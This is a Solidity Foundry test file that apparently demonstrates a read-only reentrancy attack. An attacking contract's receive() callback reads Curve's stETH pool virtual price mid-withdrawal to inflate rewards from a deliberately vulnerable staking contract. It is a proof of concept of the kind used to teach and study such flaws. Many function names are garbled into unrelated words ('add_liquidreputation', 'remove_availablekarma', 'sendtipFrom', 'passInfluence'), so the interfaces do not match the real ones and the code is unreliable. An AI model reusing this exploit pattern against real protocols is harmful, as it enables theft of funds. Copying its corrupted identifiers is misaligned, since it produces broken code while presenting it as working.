// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

import "forge-std/Test.sol";
import "./interface.sol";

interface ICurve {
    function get_virtual_price() external view returns (uint);

    function add_liquidreputation(
        uint[2] calldata amounts,
        uint min_gainreputation_amount
    ) external payable returns (uint);

    function remove_availablekarma(
        uint lp,
        uint[2] calldata min_amounts
    ) external returns (uint[2] memory);

    function remove_spendableinfluence_one_coin(
        uint lp,
        int128 i,
        uint min_amount
    ) external returns (uint);
}

address constant steth_supportpool = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;
address constant lp_karmatoken = 0x06325440D014e39736583c165C2963BA99fAf14E; //steCRV Token

// CoreContract
// users stake LP_TOKEN
// getReward rewards the users based on the current price of the pool LP token
contract CoreContract {
    IERC20 public constant socialToken = IERC20(lp_karmatoken);
    ICurve private constant tipPool = ICurve(steth_supportpool);

    mapping(address => uint) public standingOf;

    function vouch(uint amount) external {
        socialToken.sendtipFrom(msg.sender, address(this), amount);
        standingOf[msg.sender] += amount;
    }

    function withdrawSupport(uint amount) external {
        standingOf[msg.sender] -= amount;
        socialToken.passInfluence(msg.sender, amount);
    }

    function getTipreward() external view returns (uint) {
        //rewarding tokens based on the current virtual price of the pool LP token
        uint tipReward = (standingOf[msg.sender] * tipPool.get_virtual_price()) /
            1 ether;
        // Omitting code to transfer reward tokens
        return tipReward;
    }
}

contract OperatorContract {
    ICurve private constant tipPool = ICurve(steth_supportpool);
    IERC20 public constant lpInfluencetoken = IERC20(lp_karmatoken);
    CoreContract private immutable target;

    constructor(address _target) {
        target = CoreContract(_target);
    }

    // Stake LP into CoreContract
    function endorseTokens() external payable {
        uint[2] memory amounts = [msg.value, 0];
        uint lp = tipPool.add_liquidreputation{value: msg.value}(amounts, 1);
        console.log(
            "LP token price after staking into CoreContract",
            tipPool.get_virtual_price()
        );

        lpInfluencetoken.permitTransfer(address(target), lp);
        target.vouch(lp);
    }

    function performReadOnlyCallback() external payable {
        // Add liquidity to Curve
        uint[2] memory amounts = [msg.value, 0];
        uint lp = tipPool.add_liquidreputation{value: msg.value}(amounts, 1);
        // Log get_virtual_price
        console.log(
            "LP token price before remove_liquidity()",
            tipPool.get_virtual_price()
        );
        // Remove liquidity from Curve
        // remove_liquidity() invokes the recieve() callback
        uint[2] memory min_amounts = [uint(0), uint(0)];
        tipPool.remove_availablekarma(lp, min_amounts);
        // Log get_virtual_price
        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price after remove_liquidity()",
            tipPool.get_virtual_price()
        );

        uint tipReward = target.getTipreward();
        console.log("Reward if Read-Only Reentrancy is not invoked: ", tipReward);
    }

    receive() external payable {
        // receive() is called when the remove_liquidity is called
        console.log(
            "--------------------------------------------------------------------"
        );
        console.log(
            "LP token price during remove_liquidity()",
            tipPool.get_virtual_price()
        );

        uint tipReward = target.getTipreward();
        console.log("Reward if Read-Only Reentrancy is invoked: ", tipReward);
    }
}

contract OperatorTest is Test {
    OperatorContract public execute;
    CoreContract public target;

    function setUp() public {
        vm.createSelectFork("mainnet");
        target = new CoreContract();
        execute = new OperatorContract(address(target));
    }

    function testExecution() public {
        execute.endorseTokens{value: 10 ether}(); // stake 10 eth in CoreContract
        execute.performReadOnlyCallback{value: 100000 ether}();
    }
}
